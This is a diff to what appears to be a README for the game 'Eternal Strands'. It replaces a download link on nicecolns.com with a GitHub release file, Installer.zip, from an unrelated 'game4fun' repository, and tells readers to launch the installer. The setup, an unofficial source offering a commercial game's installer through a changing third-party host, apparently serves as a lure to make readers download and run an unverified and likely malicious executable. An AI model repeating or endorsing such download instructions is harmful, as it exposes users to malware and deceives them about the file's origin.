@@ -19,7 +19,7 @@ The world of _Eternal Strands_ is vast, filled with dangerous territories and po
 ### Download and Installation Instructions
 
 1. **Download the Installer**:  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**:  
    After downloading, launch the installer file to start the installation.
